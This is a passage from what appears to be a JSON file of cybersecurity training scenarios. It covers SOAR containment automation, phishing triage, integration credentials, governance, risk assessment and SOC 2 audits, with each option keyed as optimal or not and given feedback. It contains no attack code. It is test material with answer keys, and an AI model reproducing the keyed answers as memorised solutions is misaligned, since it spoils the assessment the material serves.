'Correct! Balance speed with safety using risk-based automation', 'detailed': 'Risk-based containment: low-risk actions (block external IPs, quarantine email) can be fully automated, medium-risk actions (disable user, block domain) automated with guardrails (allowlists, thresholds), and high-risk actions (isolate servers, mass actions) require human approval. This balances speed with safety.'}"}, {"id": "C", "text": "No automated containment - always require human approval", "is_optimal": false, "feedback": "{'short': 'Misses automation value for clear-cut cases', 'detailed': \"Requiring approval for everything defeats the purpose of SOAR. Blocking a known-malicious external IP is low risk and shouldn't need human approval. The goal is to automate what's safe to automate while preserving human judgment for ambiguous or high-impact decisions.\"}"}, {"id": "D", "text": "Automate during business hours only, manual after hours", "is_optimal": false, "feedback": "{'short': \"Doesn't address the actual risk factors\", 'detailed': \"Time of day isn't the primary risk factor - the nature of the action is. A false positive isolation is bad at 2 PM or 2 AM. Risk-based approach addresses what makes actions safe or risky, not when they occur.\"}"}]}, {"id": "decision_3", "title": "Phishing Playbook Design", "situation": "Phishing is the highest-volume alert type (450/day). You're designing the phishing response playbook. The team wants to automate as much as possible while maintaining accuracy.", "question": "What's the BEST approach for automated phishing classification?", "options": [{"id": "A", "text": "Fully automated classification - machine learning determines malicious/benign", "is_optimal": false, "feedback": "{'short': 'ML alone has false positive risk', 'detailed': 'Pure ML classification will have false positives that lead to blocking legitimate emails or senders. ML is valuable for scoring, but clear-cut cases should be handled by deterministic rules, and ambiguous cases should go to humans. Hybrid approach is better.'}"}, {"id": "B", "text": "Scoring system: auto-classify high-confidence cases, human review for ambiguous", "is_optimal": true, "feedback": "{'short': 'Correct! Automate the clear-cut, escalate the ambiguous', 'detailed': 'Hybrid approach: enrichment feeds into scoring (known bad indicators, sandbox results, reputation), high-confidence malicious (score > threshold) auto-classified and contained, high-confidence benign auto-closed, and ambiguous (middle scores) queued for human review. This automates the majority while preserving human judgment for edge cases.'}"}, {"id": "C", "text": "All classification requires human review - automation only assists", "is_optimal": false, "feedback": "{'short': 'Misses opportunity to automate clear-cut cases', 'detailed': 'Requiring human review for every email means 450 manual reviews per day. Many phishing emails are clearly malicious (known bad URLs, failed sandbox). Automate the obvious cases to free analysts for the genuinely ambiguous ones.'}"}, {"id": "D", "text": "Auto-classify based on sender reputation only", "is_optimal": false, "feedback": "{'short': 'Single factor is insufficient', 'detailed': 'Sender reputation alone misses many attack types: compromised legitimate senders, new domains, spoofing. Effective classification needs multiple factors: sender reputation, URL analysis, attachment analysis, and content indicators. Single-factor classification has high error rates.'}"}]}, {"id": "decision_4", "title": "Integration Security", "situation": "The SOAR platform needs to integrate with multiple systems: SIEM, EDR, email, Active Directory, firewalls. Each integration requires authentication credentials. IT security is concerned about credential management.", "question": "What is the MOST important security consideration for SOAR integrations?", "options": [{"id": "A", "text": "Use personal admin accounts for integrations - easier to manage", "is_optimal": false, "feedback": "{'short': 'Personal accounts create accountability and security issues', 'detailed': 'Personal accounts for automation: no accountability (who did what?), credentials tied to individual (employee leaves = broken integrations), potential for misuse, and violates least privilege. Always use dedicated service accounts.'}"}, {"id": "B", "text": "Dedicated service accounts with least privilege and credential vaulting", "is_optimal": true, "feedback": "{'short': 'Correct! Service accounts with proper controls', 'detailed': 'Integration security: dedicated service accounts (clear accountability, survive employee turnover), least privilege (only permissions needed for specific automation), credential vaulting (secrets managed securely, not in plaintext), regular rotation, and audit logging of all automated actions.'}"}, {"id": "C", "text": "Single master account with full admin access to all systems", "is_optimal": false, "feedback": "{'short': 'Violates least privilege - excessive risk', 'detailed': \"Single account with full admin: if compromised, attacker has access to everything. SOAR doesn't need full admin - it needs specific permissions for specific actions. Separate service accounts per integration with least privilege limits blast radius.\"}"}, {"id": "D", "text": "API keys stored in the SOAR platform configuration", "is_optimal": false, "feedback": "{'short': 'Better than plaintext but proper vaulting is preferred', 'detailed': 'Storing API keys in platform config is better than plaintext files but: SOAR platforms have their own vulnerabilities, keys should be in dedicated secrets management, and rotation should be automated. Use proper credential vaulting (HashiCorp Vault, Azure Key Vault) when possible.'}"}]}, {"id": "decision_5", "title": "Playbook Testing Strategy", "situation": "You've built a new malware response playbook that can isolate infected endpoints. Before production deployment, you need to validate it works correctly and won't cause problems.", "question": "What is the BEST approach to testing the playbook before production?", "options": [{"id": "A", "text": "Deploy to production and monitor closely", "is_optimal": false, "feedback": "{'short': 'Testing in production risks real-world impact', 'detailed': 'Production testing with containment actions risks isolating legitimate systems, disrupting business operations, and losing organizational trust in automation. Test thoroughly before production deployment.'}"}, {"id": "B", "text": "Test with synthetic data, then run in shadow mode before enabling actions", "is_optimal": true, "feedback": "{'short': 'Correct! Progressive testing builds confidence', 'detailed': \"Playbook testing progression: development testing with synthetic data (verify logic), shadow mode (run against real alerts, log what WOULD happen but don't act), comparison (validate shadow decisions match what analysts would do), and then production enablement. This catches issues before they impact production.\"}"}, {"id": "C", "text": "Test only with known malware samples", "is_optimal": false, "feedback": "{'short': 'Misses edge cases and false positive scenarios', 'detailed': 'Testing only positive cases misses: false positives (legitimate software triggering detection), edge cases (unusual environments), and failure scenarios (what if integration is down?). Test both positive and negative cases.'}"}, {"id": "D", "text": "Have analysts review the playbook code", "is_optimal": false, "feedback": "{'short': \"Code review is helpful but doesn't replace functional testing\", 'detailed': \"Code review catches logic errors but doesn't validate real-world behavior. Integrations may behave differently than expected, edge cases may not be obvious in code, and performance issues only appear in testing. Review AND test.\"}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-REM-001", "domain": 5, "type": "REM", "title": "Policy and Governance Fundamentals", "difficulty": "foundational", "role": "Junior Security Analyst", "organization": {"name": "Coastal Credit Union"}, "introduction": "You're a junior security analyst at Coastal Credit Union. Your manager has asked you to help formalize the security program by understanding and applying governance fundamentals. The credit union has operated informally, but regulatory pressure requires documented policies and clear governance. This scenario will reinforce your understanding of policy hierarchy, governance structures, and how these elements work together.", "decision_points": [{"id": "dp1", "title": "Document Type Identification", "situation": "Your manager shows you four documents and asks you to identify their types:\n\n**Document A:** 'All information systems must use encryption to protect sensitive member data. Encryption protects our members' privacy and ensures regulatory compliance.'\n\n**Document B:** 'Encryption must use AES-256 for data at rest and TLS 1.3 for data in transit.'\n\n**Document C:** 'To enable encryption on the database server: 1) Open SQL Management Studio, 2) Navigate to Security settings, 3) Select Transparent Data Encryption, 4) Generate certificate, 5) Enable encryption.'\n\n**Document D:** 'When selecting encryption solutions, consider factors such as performance impact, key management complexity, and vendor support availability.'\n\nWhat type is each document?", "question": "What would you do?", "options": [{"id": "a", "text": "A=Standard, B=Policy, C=Guideline, D=Procedure", "is_optimal": false, "feedback": "Incorrect. Document A states intent and direction ('must use encryption... protects privacy') - that's a policy. Document B specifies exact requirements (AES-256, TLS 1.3) - that's a standard. Review the definitions: policies state what and why; standards specify what exactly."}, {"id": "b", "text": "A=Policy, B=Standard, C=Procedure, D=Guideline", "is_optimal": true, "feedback": "Correct! Document A is a policy (management intent, high-level direction). Document B is a standard (specific technical requirements). Document C is a procedure (step-by-step instructions). Document D is a guideline (recommendations, not mandatory)."}, {"id": "c", "text": "A=Policy, B=Procedure, C=Standard, D=Guideline", "is_optimal": false, "feedback": "Close, but B and C are swapped. Document B (AES-256, TLS 1.3) specifies WHAT is required - that's a standard. Document C provides step-by-step HOW instructions - that's a procedure. Standards define requirements; procedures explain how to meet them."}, {"id": "d", "text": "A=Guideline, B=Standard, C=Procedure, D=Policy", "is_optimal": false, "feedback": "Incorrect. Document A uses mandatory language ('must use') and establishes direction - that's a policy, not a guideline. Document D uses suggestive language ('consider factors') - that's a guideline. Guidelines are recommendations; policies are mandates."}]}, {"id": "dp2", "title": "Governance Structure Basics", "situation": "The credit union CEO asks: 'Who should be responsible for approving our security policies? We're a small organization - do we really need a formal structure?'\n\nYour options to recommend:", "question": "What would you do?", "options": [{"id": "a", "text": "The IT Manager should approve all security documents since they understand the technical details", "is_optimal": false, "feedback": "IT Manager approval is insufficient for policies. Policies represent organizational commitments, not just technical decisions. IT should implement policies but executives should approve them. This ensures policies have organizational authority and support."}, {"id": "b", "text": "Even small organizations need tiered approval: Board for major policies, CEO for operational policies, managers for procedures", "is_optimal": true, "feedback": "Correct! Governance scales to organization size but maintains proper authority levels. Board provides oversight for significant policies. CEO approves operational policies. Managers approve procedures within their areas. This creates accountability without excessive bureaucracy."}, {"id": "c", "text": "Small organizations don't need formal governance; the security team can manage everything informally", "is_optimal": false, "feedback": "Informal governance creates accountability gaps and regulatory issues. Financial institutions specifically require documented governance. 'Small' doesn't mean 'no governance' - it means 'right-sized governance.' Structure can be simple but must exist."}, {"id": "d", "text": "Hire a CISO to handle all security governance decisions", "is_optimal": false, "feedback": "A CISO can lead security but doesn't replace governance structure. Even with a CISO, Board oversight, executive approval, and clear accountability are still needed. Adding a role doesn't address the governance structure question."}]}, {"id": "dp3", "title": "Policy Development Scenario", "situation": "The credit union needs an Acceptable Use Policy (AUP). Your manager asks you to draft it. You find an AUP template online that's 25 pages long with detailed technical specifications.\n\nHow should you approach creating the policy?", "question": "What would you do?", "options": [{"id": "a", "text": "Use the 25-page template as-is since it's comprehensive", "is_optimal": false, "feedback": "A 25-page policy is too detailed and likely includes standard and procedure content mixed in. Policies should be high-level and readable. Lengthy policies aren't read or followed. Extract the policy elements and put details in standards/procedures."}, {"id": "b", "text": "Create a concise policy stating acceptable use principles, with separate standards for specific requirements", "is_optimal": true, "feedback": "Correct! The policy should establish principles (authorized use, personal use limits, prohibited activities, monitoring notice). Specific requirements (password complexity, approved software) belong in standards. This maintains proper hierarchy and creates readable documents."}, {"id": "c", "text": "Skip the policy and just create procedures that tell people what to do", "is_optimal": false, "feedback": "Procedures without policy lack authority and context. Policy establishes management's intent and authority for requirements. Without policy, procedures have no foundation. Staff don't understand why they're following procedures."}, {"id": "d", "text": "Create a policy that covers everything so we only need one document", "is_optimal": false, "feedback": "All-in-one documents become unwieldy and hard to maintain. When technical requirements change (new password standard), the whole 'policy' needs executive re-approval. Separation allows updates at appropriate levels without unnecessary approval cycles."}]}, {"id": "dp4", "title": "Exception Management", "situation": "A loan officer requests an exception to the clean desk policy. They say: 'I work with paper loan documents all day. It's impossible to lock everything away every time I step away from my desk for a minute.'\n\nHow should exceptions be handled?", "question": "What would you do?", "options": [{"id": "a", "text": "Deny all exceptions; policies must be followed consistently", "is_optimal": false, "feedback": "Zero-tolerance exception policies are unrealistic and create workarounds. Legitimate operational constraints sometimes require exceptions. The key is having a process to evaluate and manage exceptions appropriately, not refusing all exceptions."}, {"id": "b", "text": "Let department managers approve exceptions for their staff", "is_optimal": false, "feedback": "Department manager approval alone lacks security perspective. Manager might approve to make their employee happy without considering security implications. Exceptions need security review to evaluate risk and identify compensating controls."}, {"id": "c", "text": "Evaluate the request: if legitimate operational need exists, approve with compensating controls and documented risk acceptance", "is_optimal": true, "feedback": "Correct! Evaluate whether the need is legitimate (operational constraint vs. convenience). If legitimate, identify compensating controls (locked office, visitor escort, document covers). Document the exception with risk acceptance by appropriate authority. Review periodically."}, {"id": "d", "text": "Change the policy to allow exceptions whenever staff find it inconvenient", "is_optimal": false, "feedback": "Changing policy for convenience undermines security. If clean desk is important (it is for financial institutions), the policy should stand. Individual circumstances are handled through exceptions, not policy changes. Policies shouldn't be weakened for convenience."}]}, {"id": "dp5", "title": "Policy Communication", "situation": "New policies have been approved. Your manager asks: 'How do we make sure employees actually follow these policies? Last time we sent a policy email, nobody read it.'\n\nWhat approach do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Email all policies to staff and require acknowledgment signature", "is_optimal": false, "feedback": "Email and acknowledgment creates compliance evidence but doesn't ensure understanding or behavior change. Staff click 'acknowledge' without reading. This is necessary but not sufficient. Communication must include understanding, not just distribution."}, {"id": "b", "text": "Multi-channel approach: awareness training, role-specific guidance, manager reinforcement, and practical examples", "is_optimal": true, "feedback": "Correct! Effective policy communication uses multiple channels. Training provides understanding. Role-specific guidance makes it relevant. Manager reinforcement creates accountability. Practical examples show application. This actually changes behavior, not just creates documentation."}, {"id": "c", "text": "Post policies on the intranet and tell staff they're responsible for reading them", "is_optimal": false, "feedback": "Passive posting puts all burden on employees. Most won't seek out and read policies. Security is responsible for effective communication, not just availability. 'It's on the intranet' is not adequate communication."}, {"id": "d", "text": "Focus on enforcement; people will learn policies when they get in trouble for violating them", "is_optimal": false, "feedback": "Enforcement without communication is unfair and ineffective. Staff should know rules before being punished. Enforcement alone creates adversarial relationship with security. Communication comes first; enforcement supports it."}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-REM-002", "domain": 5, "type": "REM", "title": "Risk Assessment Basics", "difficulty": "foundational", "role": "IT Security Specialist", "organization": {"name": "Greenfield Medical Clinic"}, "introduction": "You're an IT security specialist at Greenfield Medical Clinic. The practice administrator has asked you to help identify and assess security risks following a ransomware attack on a similar clinic nearby. This scenario will reinforce your understanding of risk assessment fundamentals including risk components, assessment methods, and risk treatment options.", "decision_points": [{"id": "dp1", "title": "Understanding Risk Components", "situation": "The practice administrator describes a concern: 'Our medical devices connect to the network but don't get security updates because the manufacturer says updates might affect FDA approval. I'm worried hackers could target these devices.'\n\nIdentify the risk components in this scenario:", "question": "What would you do?", "options": [{"id": "a", "text": "Threat: Medical devices; Vulnerability: Network connection; Impact: FDA approval issues", "is_optimal": false, "feedback": "Incorrect assignment. Medical devices are assets, not threats. Threats are actors or events (like hackers). The vulnerability is the lack of security updates. FDA approval isn't the impact - patient harm or data breach would be impacts."}, {"id": "b", "text": "Threat: Hackers/malware; Vulnerability: Unpatched medical devices; Impact: Patient data breach, device manipulation, regulatory penalties", "is_optimal": true, "feedback": "Correct! Hackers and malware are threats (actors/events that could cause harm). Unpatched devices are the vulnerability (weakness). Patient data breach, device manipulation, and regulatory penalties are impacts (consequences). Likelihood depends on attacker interest and exposure."}, {"id": "c", "text": "Threat: Network connection; Vulnerability: Hackers; Impact: Security updates", "is_optimal": false, "feedback": "Components are confused. Network connection is infrastructure, not a threat. Hackers are threats, not vulnerabilities. Security updates (or lack thereof) are a vulnerability factor, not an impact. Review the definitions."}, {"id": "d", "text": "Threat: FDA regulations; Vulnerability: Medical device security; Impact: Hacker attacks", "is_optimal": false, "feedback": "FDA regulations aren't threats - they're constraints. Hacker attacks aren't impacts - attacks are threat events. The impact is what happens after a successful attack (data breach, patient harm). Threats and impacts are commonly confused."}]}, {"id": "dp2", "title": "Qualitative vs. Quantitative Assessment", "situation": "The CFO asks: 'What's the actual dollar risk from a ransomware attack? I need numbers for the board presentation.'\n\nYou have limited historical data and time. How do you approach the risk assessment?", "question": "What would you do?", "options": [{"id": "a", "text": "Provide precise dollar figures using industry averages: 'A ransomware attack would cost exactly $287,453'", "is_optimal": false, "feedback": "False precision is misleading. Without specific data about your environment, exact figures are guesses dressed up as analysis. Industry averages don't reflect your specific situation. This creates false confidence in unreliable numbers."}, {"id": "b", "text": "Use qualitative assessment (High/Medium/Low) with ranges, explaining limitations of more precise estimates", "is_optimal": true, "feedback": "Correct! With limited data, qualitative assessment with ranges is more honest and useful. 'Impact is High - potentially $200K-$500K based on similar incidents' is more accurate than false precision. Explain why precise numbers aren't available."}, {"id": "c", "text": "Refuse to provide any estimates since we don't have enough data for accurate quantification", "is_optimal": false, "feedback": "Refusing to assess risk doesn't help decision-making. Risk assessment doesn't require perfect data. Qualitative assessment with acknowledged limitations is valuable. Leadership needs risk information even if imperfect."}, {"id": "d", "text": "Hire consultants to perform detailed quantitative analysis before making any risk statements", "is_optimal": false, "feedback": "Detailed quantitative analysis takes time and money that may not be available. For many risks, qualitative assessment is sufficient. Quantitative analysis should be reserved for significant investment decisions where precision matters."}]}, {"id": "dp3", "title": "Risk Treatment Options", "situation": "Your risk assessment identified several risks. For each, you need to recommend treatment. The practice administrator asks: 'What are our options for handling these risks?'\n\n**Risk 1:** Medical device vulnerability (High risk, can't patch)\n**Risk 2:** Earthquake damage to server room (Low likelihood, High impact)\n**Risk 3:** Employee accidentally emailing patient data (Medium risk)\n**Risk 4:** Using an unsupported legacy billing system\n\nMatch each risk with the most appropriate treatment approach.", "question": "What would you do?", "options": [{"id": "a", "text": "1=Accept, 2=Mitigate, 3=Transfer, 4=Avoid", "is_optimal": false, "feedback": "Incorrect matches. Accepting high risk from medical devices without controls is inappropriate. Mitigation for earthquake is incomplete without transfer. Legacy system risk should be avoided by replacement if unsupported creates unacceptable risk."}, {"id": "b", "text": "1=Mitigate (compensating controls), 2=Transfer (insurance) + Mitigate (backup), 3=Mitigate (training, DLP), 4=Avoid (replace system)", "is_optimal": true, "feedback": "Correct! Medical devices: Can't patch but can segment network, monitor, and limit access (mitigate). Earthquake: Get insurance (transfer) AND maintain offsite backups (mitigate). Email risk: Training and technical controls (mitigate). Legacy system: Replace with supported system (avoid)."}, {"id": "c", "text": "1=Mitigate, 2=Accept, 3=Avoid, 4=Transfer", "is_optimal": false, "feedback": "Several issues. Accepting earthquake risk without transfer (insurance) is poor risk management for high-impact scenarios. Avoiding email risk entirely isn't practical - you need to mitigate it. Can't transfer legacy system risk - you own it."}, {"id": "d", "text": "Accept all risks since small organizations can't afford extensive controls", "is_optimal": false, "feedback": "Accepting all risks isn't risk management. Every organization can implement some controls proportionate to their resources. Even small clinics can segment networks, train staff, and purchase insurance. Acceptance should be conscious choice, not default."}]}, {"id": "dp4", "title": "Risk Prioritization", "situation": "Your assessment identified these risks:\n\n| Risk | Likelihood | Impact | \n|------|------------|--------|\n| A: Ransomware attack | High | High |\n| B: Employee loses laptop | Medium | Medium |\n| C: Natural disaster | Low | High |\n| D: Phishing leads to credential theft | High | Medium |\n\nWith limited resources, how do you prioritize these risks?", "question": "What would you do?", "options": [{"id": "a", "text": "Address in order: D, B, C, A (alphabetically reversed for no particular reason)", "is_optimal": false, "feedback": "Random or arbitrary prioritization doesn't optimize risk reduction. Risk prioritization should be systematic based on risk levels. High likelihood AND high impact risks (A) should typically be addressed first."}, {"id": "b", "text": "Priority order: A (High/High), D (High/Medium), B (Medium/Medium), C (Low/High) - based on risk level", "is_optimal": true, "feedback": "Correct! Risk level combines likelihood and impact. A (High/High) is highest priority. D (High/Medium) is next because high likelihood means it's likely to occur. B and C are lower priority, though C's high impact means it shouldn't be ignored (transfer with insurance)."}, {"id": "c", "text": "Focus only on A since it's the only High/High; ignore the others", "is_optimal": false, "feedback": "Focusing only on the highest risk ignores other significant risks. D is also important due to high likelihood. Even lower-priority risks need attention - C should have insurance even if not highest priority. Risk management is comprehensive, not single-focus."}, {"id": "d", "text": "Address C first since natural disaster would be catastrophic", "is_optimal": false, "feedback": "High impact alone doesn't determine priority when likelihood is low. C's low likelihood means ransomware (high likelihood, high impact) is more urgent. However, C shouldn't be ignored - transfer risk through insurance while focusing mitigation effort on more likely risks."}]}, {"id": "dp5", "title": "Risk Communication", "situation": "You need to present your risk assessment findings to clinic leadership. The practice administrator, medical director, and CFO will attend. They have varying technical backgrounds.\n\nHow do you communicate the risk findings effectively?", "question": "What would you do?", "options": [{"id": "a", "text": "Present technical details: CVE numbers, CVSS scores, attack vectors, and technical controls needed", "is_optimal": false, "feedback": "Technical details overwhelm non-technical audiences. CVE numbers and CVSS scores are meaningless to the medical director and CFO. Risk communication should translate technical findings into business terms. What does this mean for patient care, finances, and operations?"}, {"id": "b", "text": "Focus on business impact: patient safety risks, financial exposure, operational disruption, and regulatory implications", "is_optimal": true, "feedback": "Correct! Business leaders care about patient care, money, operations, and staying out of regulatory trouble. Translate technical risks into these terms. 'Unpatched devices could allow attackers to disrupt patient care and trigger HIPAA breach notification' is more meaningful than 'CVE-2023-XXXX allows remote code execution.'"}, {"id": "c", "text": "Downplay risks to avoid alarming leadership; they might overreact", "is_optimal": false, "feedback": "Downplaying risks is dishonest and dangerous. Leadership needs accurate information to make decisions. If they 'overreact' by investing in security, that may be appropriate. Your job is accurate communication, not managing their reaction."}, {"id": "d", "text": "Provide the risk register spreadsheet and let them draw their own conclusions", "is_optimal": false, "feedback": "Raw data without context and interpretation isn't effective communication. Leadership expects analysis and recommendations, not just data. Your value is translating technical findings into actionable insights for business decision-makers."}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-REM-003", "domain": 5, "type": "REM", "title": "Compliance Concepts", "difficulty": "foundational", "role": "IT Compliance Coordinator", "organization": {"name": "Summit Software Solutions"}, "introduction": "You're an IT compliance coordinator at Summit Software Solutions. The company is experiencing growth and customers are increasingly asking for security certifications and audit reports. Your first SOC 2 audit is approaching. This scenario will reinforce your understanding of compliance fundamentals, audit types, and how to prepare for assessments.", "decision_points": [{"id": "dp1", "title": "Understanding Compliance Types", "situation": "Your sales team has questions about customer security requirements:\n\n**Customer A (Healthcare):** 'We need to see your HIPAA compliance documentation'\n**Customer B (Financial):** 'Do you have SOC 2 Type II report?'\n**Customer C (Enterprise):** 'Please complete our 200-question security questionnaire'\n**Customer D (Government):** 'We require FedRAMP authorization'\n\nThe VP of Sales asks: 'Which of these are actual legal requirements and which are just customer requests?'", "question": "What would you do?", "options": [{"id": "a", "text": "All are legal requirements because customers are asking for them", "is_optimal": false, "feedback": "Customer requests aren't automatically legal requirements. HIPAA and FedRAMP have legal/regulatory basis. SOC 2 is a voluntary attestation standard. Questionnaires are contractual, not legal requirements. Understanding the difference affects how you prioritize and approach each."}, {"id": "b", "text": "HIPAA and FedRAMP are regulatory requirements; SOC 2 and questionnaires are business/contractual requirements", "is_optimal": true, "feedback": "Correct! HIPAA is federal law for healthcare data. FedRAMP is federal requirement for cloud services to government. SOC 2 is voluntary attestation that customers often require contractually. Questionnaires are customer-specific contractual requirements. All matter, but for different reasons."}, {"id": "c", "text": "Only government requirements (FedRAMP) are actual compliance; others are just security requests", "is_optimal": false, "feedback": "HIPAA is also a legal compliance requirement, not just a security request. SOC 2, while voluntary, becomes a compliance obligation when contractually required. Compliance extends beyond government requirements to include legal and contractual obligations."}, {"id": "d", "text": "None are compliance requirements since we're a software company, not a regulated industry", "is_optimal": false, "feedback": "Software companies have compliance requirements too. If you process healthcare data, HIPAA applies. If you sell to government, FedRAMP may apply. Customer contracts create compliance obligations. 'We're not regulated' is rarely true in modern business."}]}, {"id": "dp2", "title": "Understanding Audit Types", "situation": "A customer asks about your SOC 2 report. You know you're getting a SOC 2 audit but aren't sure about the details. The auditor mentions 'Type I' versus 'Type II' reports.\n\nWhat's the difference, and which should you pursue?", "question": "What would you do?", "options": [{"id": "a", "text": "Type I is for small companies; Type II is for large enterprises", "is_optimal": false, "feedback": "Company size doesn't determine Type I vs Type II. Type I assesses control design at a point in time. Type II assesses design AND operating effectiveness over a period. Most customers want Type II because it shows controls actually work, not just that they exist on paper."}, {"id": "b", "text": "Type I is point-in-time design assessment; Type II is period-based assessment of design AND operating effectiveness", "is_optimal": true, "feedback": "Correct! Type I says 'your controls were properly designed on this date.' Type II says 'your controls were designed properly AND operated effectively over this 6-12 month period.' Type II is more valuable because it demonstrates sustained compliance, not just a snapshot."}, {"id": "c", "text": "Type I covers security; Type II covers security plus availability", "is_optimal": false, "feedback": "Type I and Type II don't differ by which trust services criteria (security, availability, etc.) are covered - both can cover any criteria you choose. The difference is assessment depth: point-in-time design vs. period-based operating effectiveness."}, {"id": "d", "text": "Type I is internal audit; Type II is external audit", "is_optimal": false, "feedback": "Both Type I and Type II are performed by external auditors (CPAs). Internal audit is a separate function. The Type I/II distinction relates to what's assessed, not who performs it."}]}, {"id": "dp3", "title": "Evidence Collection", "situation": "The SOC 2 auditor has sent an initial request list. Items include:\n\n- Access control policy\n- Evidence of access reviews for the period\n- Change management ticket samples\n- Security awareness training records\n- Incident response plan and incident logs\n\nYour team is scrambling because evidence is scattered or doesn't exist. How do you approach evidence management going forward?", "question": "What would you do?", "options": [{"id": "a", "text": "Create the missing evidence now and date it appropriately to cover the audit period", "is_optimal": false, "feedback": "Creating backdated evidence is fraud. Auditors are trained to detect fabricated evidence. If evidence doesn't exist, be honest - it's a finding, not a crime. Fabricating evidence is both unethical and likely to be discovered, resulting in much worse consequences."}, {"id": "b", "text": "Implement continuous evidence collection process: automated where possible, systematic collection schedule, central repository", "is_optimal": true, "feedback": "Correct! Evidence should be collected continuously as controls operate, not gathered before audits. Automate collection where possible (system logs, access exports). Schedule manual collection (review documentation). Store centrally for easy retrieval. This prevents scrambles."}, {"id": "c", "text": "Hire a consultant to gather evidence before each audit", "is_optimal": false, "feedback": "Consultants can help but evidence must be collected as controls operate. You can't gather evidence of a quarterly access review that didn't happen. Consultants can organize existing evidence, but control owners must generate it during normal operations."}, {"id": "d", "text": "Tell the auditor we're a startup and formal evidence isn't realistic for our size", "is_optimal": false, "feedback": "Auditors assess against standards, not company size. If you want SOC 2, you need evidence. 'We're small' doesn't excuse lack of controls. You can scale processes to size, but documentation of control operation is required regardless of company size."}]}, {"id": "dp4", "title": "Handling Audit Findings", "situation": "The SOC 2 audit is complete. The auditor presents findings:\n\n**Control Exception:** 2 of 25 sampled changes lacked documented approval before implementation\n**Control Deviation:** Access reviews were performed quarterly instead of monthly as stated in policy\n\nThe auditor says these will be noted in the report. Your CEO asks: 'Is this bad? Can we get them removed?'", "question": "What would you do?", "options": [{"id": "a", "text": "Argue with the auditor to remove findings; they'll hurt our reputation", "is_optimal": false, "feedback": "Arguing to remove legitimate findings damages credibility and is usually unsuccessful. Auditors must report what they find. If findings are factually accurate, the appropriate response is to acknowledge and remediate, not argue for removal."}, {"id": "b", "text": "Accept findings, provide management response explaining root cause and remediation plan", "is_optimal": true, "feedback": "Correct! Findings in SOC 2 reports are common and manageable. Provide a thoughtful management response: acknowledge the issue, explain what happened (root cause), describe corrective action, and commit to timeline. Customers understand that no organization is perfect."}, {"id": "c", "text": "These findings will make the report worthless; don't release it to customers", "is_optimal": false, "feedback": "Minor findings don't invalidate the report. Most SOC 2 reports have some exceptions or deviations. Customers understand this. Not releasing the report is worse - it looks like you're hiding something. Transparency with explanation is better than avoidance."}, {"id": "d", "text": "Change the policy to match what actually happens (quarterly instead of monthly reviews)", "is_optimal": false, "feedback": "Changing policy to match deviation addresses the finding but may weaken security. Evaluate whether monthly reviews are actually needed. If yes, fix the process. If quarterly is sufficient, then update the policy. But don't weaken controls just to eliminate findings."}]}, {"id": "dp5", "title": "Continuous Compliance", "situation": "After your first SOC 2 report, the CEO asks: 'Do we have to do this every year? Can't we just reuse this report?'\n\nHow do you explain ongoing compliance?", "question": "What would you do?", "options": [{"id": "a", "text": "Yes, we can use this report for several years; SOC 2 is a one-time certification", "is_optimal": false, "feedback": "SOC 2 reports have a defined period and become stale. Type II reports cover a specific period (e.g., Jan 1 - Dec 31, 2024). After that period, the report doesn't represent current state. Customers expect recent reports, typically within 12 months."}, {"id": "b", "text": "SOC 2 requires annual reports; compliance is ongoing, not one-time", "is_optimal": true, "feedback": "Correct! SOC 2 reports cover a specific period and need to be renewed. Customers expect recent reports - typically within 12 months. Compliance is continuous: maintain controls, collect evidence throughout the year, and get annual attestation. This demonstrates sustained commitment."}, {"id": "c", "text": "We only need another audit if customers specifically ask for it", "is_optimal": false, "feedback": "Waiting for customers to ask creates gaps. When a customer asks for a current report and you don't have one, you may lose the deal. Proactive annual audits ensure you always have current report ready. Compliance should be proactive, not reactive."}, {"id": "d", "text": "We can skip years where nothing changed; only audit when we make changes", "is_optimal": false, "feedback": "Audits verify that controls operated, not just that they exist. Even without changes, you need to demonstrate controls operated throughout the period. Access reviews happened, backups ran, training was completed. 'Nothing changed' doesn't mean compliance evidence exists."}]}], "passing_score": 70, "max_score": 100}, {"id": "D5-SIM-001", "domain": 5, "type": "SIM", "title": "Security Governance and Policy Development", "difficulty": "intermediate", "role": "Security Policy Manager", "organization": {"name": "Meridian Healthcare Systems"}, "introduction": "You've been hired as Security Policy Manager at Meridian Healthcare Systems to establish a unified security governance framework. The organization has grown through acquisition, leaving a patchwork of security policies, procedures, and practices. Leadership wants a cohesive program that satisfies regulatory requirements, supports clinical operations, and establishes clear accountability. You'll develop the governance structure, create foundational policies, and implement a sustainable policy lifecycle.", "decision_points": [{"id": "dp1", "title": "Governance Document Assessment", "situation": "Your initial assessment reveals significant documentation gaps. You've inventoried what exists:\n\n**Legacy Meridian (main hospital):**\n- Acceptable Use Policy (last updated 2019)\n- Password Policy (last updated 2021)\n- Incident Response Plan (undated)\n\n**Acquired Clinic Network:**\n- Information Security Policy (2022, comprehensive but different approach)\n- HIPAA Privacy Policy (current)\n- No technical standards or procedures documented\n\n**Recently Acquired Research Clinic:**\n- Research Data Policy (current, but narrow scope)\n- No general security documentation\n\nLeadership asks you to prioritize. What's your first governance priority?", "question": "What would you do?", "options": [{"id": "a", "text": "Update all existing policies to current standards immediately", "is_optimal": false, "feedback": "Updating existing policies without a unified framework creates more fragmentation. You'd be patching a broken structure rather than building a solid foundation. The policies would still lack coherence and may conflict with each other."}, {"id": "b", "text": "Create a master Information Security Policy establishing governance framework first", "is_optimal": true, "feedback": "Excellent approach. A master Information Security Policy establishes the foundation: governance structure, roles and responsibilities, policy hierarchy, and principles that all other documents will follow. This creates coherence before detailed policies are developed."}, {"id": "c", "text": "Adopt the acquired clinic network's comprehensive policy as the organization standard", "is_optimal": false, "feedback": "While expedient, adopting one facility's policy ignores the specific needs of hospital operations, research requirements, and the existing culture at other facilities. Imposed policies face resistance and may not address all regulatory requirements across different care settings."}, {"id": "d", "text": "Focus on HIPAA compliance documentation since it's the primary regulatory requirement", "is_optimal": false, "feedback": "HIPAA is important but represents only one aspect of security governance. Focusing solely on compliance creates a checkbox mentality and misses broader security needs. A comprehensive governance framework naturally incorporates compliance requirements."}]}, {"id": "dp2", "title": "Governance Structure Design", "situation": "With approval to develop a master Information Security Policy, you need to define the governance structure. The CISO reports to the CFO currently. You're designing committees and roles that will provide oversight and decision-making authority.\n\nThe CEO has asked: 'Who should ultimately be accountable for information security, and what committees do we need?'\n\nWhich governance structure do you recommend?", "question": "What would you do?", "options": [{"id": "a", "text": "Security 